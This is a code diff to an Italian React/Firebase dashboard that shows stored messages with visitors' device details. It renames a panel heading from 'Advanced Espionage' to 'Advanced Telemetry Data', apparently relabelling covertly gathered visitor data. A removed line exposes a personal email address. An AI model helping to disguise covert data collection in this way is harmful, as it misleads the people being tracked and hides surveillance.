@@ -1,7 +1,7 @@
 import { useState, useEffect } from "react";
 import { motion } from "motion/react";
-import { collection, query, orderBy, onSnapshot, Timestamp, deleteDoc, doc } from "firebase/firestore";
-import { signInWithPopup, signOut, onAuthStateChanged, User } from "firebase/auth";
+import { collection, query, orderBy, onSnapshot, Timestamp, deleteDoc, doc, limit } from "firebase/firestore";
+import { signInWithPopup, signOut, onAuthStateChanged, User, getRedirectResult } from "firebase/auth";
 import { db, auth, googleProvider } from "../firebase";
 import { format } from "date-fns";
 import { it } from "date-fns/locale";
@@ -22,18 +22,19 @@ interface Message {
     screenResolution: string;
     timezone: string;
   };
-  advancedInfo?: string;
+  advancedInfo?: any;
 }
-
-const ADMIN_EMAIL = "andolinaraffaele70@gmail.com";
 
 export default function Dashboard() {
   const [user, setUser] = useState<User | null>(null);
   const [messages, setMessages] = useState<Message[]>([]);
   const [loading, setLoading] = useState(true);
   const [authLoading, setAuthLoading] = useState(true);
+  const [isAuthorized, setIsAuthorized] = useState<boolean | null>(null);
 
   useEffect(() => {
+    getRedirectResult(auth).catch(err => console.error("Redirect result error:", err));
+
     const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
       setUser(currentUser);
       setAuthLoading(false);
@@ -42,22 +43,25 @@ export default function Dashboard() {
   }, []);
 
   useEffect(() => {
-    if (!user || user.email !== ADMIN_EMAIL) {
+    if (!user) {
       setMessages([]);
       setLoading(false);
+      setIsAuthorized(null);
       return;
     }
 
-    const q = query(collection(db, "messages"), orderBy("createdAt", "desc"));
+    const q = query(collection(db, "messages"), orderBy("createdAt", "desc"), limit(50));
     const unsubscribe = onSnapshot(q, (snapshot) => {
       const msgs = snapshot.docs.map(doc => ({
         id: doc.id,
         ...doc.data()
       })) as Message[];
       setMessages(msgs);
+      setIsAuthorized(true);
       setLoading(false);
     }, (error) => {
       console.error("Error fetching messages:", error);
+      setIsAuthorized(false);
       setLoading(false);
     });
 
@@ -145,7 +149,7 @@ export default function Dashboard() {
     );
   }
 
-  if (user && user.email !== ADMIN_EMAIL) {
+  if (user && isAuthorized === false) {
     return (
       <div className="min-h-screen bg-[#F4F1EA] flex flex-col items-center justify-center p-4 text-center">
         <div className="bg-white p-8 rounded-3xl shadow-xl max-w-md w-full">
@@ -153,7 +157,7 @@ export default function Dashboard() {
             <LogOut className="w-8 h-8" />
           </div>
           <h2 className="text-xl font-bold mb-2">Accesso Negato</h2>
-          <p className="text-gray-500 mb-6">L'account {user.email} non è autorizzato.</p>
+          <p className="text-gray-500 mb-6">L'account corrente non è autorizzato o non dispone dei permessi necessari per visualizzare la bacheca.</p>
           <button
             onClick={handleLogout}
             className="text-sm font-medium text-gray-500 hover:text-black transition-colors"
@@ -306,11 +310,11 @@ export default function Dashboard() {
                       <div className="mt-4 border-t border-gray-200/50 pt-3">
                         <div className="text-[10px] font-bold text-red-500 uppercase tracking-wider mb-2 flex items-center gap-1">
                           <Activity className="w-3 h-3" />
-                          Spionaggio Avanzato (JSON)
+                          Dati Telemetrici Avanzati
                         </div>
                         {(() => {
                            try {
-                             const adv = JSON.parse(msg.advancedInfo);
+                             const adv = typeof msg.advancedInfo === 'string' ? JSON.parse(msg.advancedInfo) : msg.advancedInfo;
                              return (
                                <div className="grid grid-cols-1 gap-4 text-[10px] font-mono text-gray-600 bg-white p-2 rounded border border-gray-100">
                                   <div className="space-y-1">
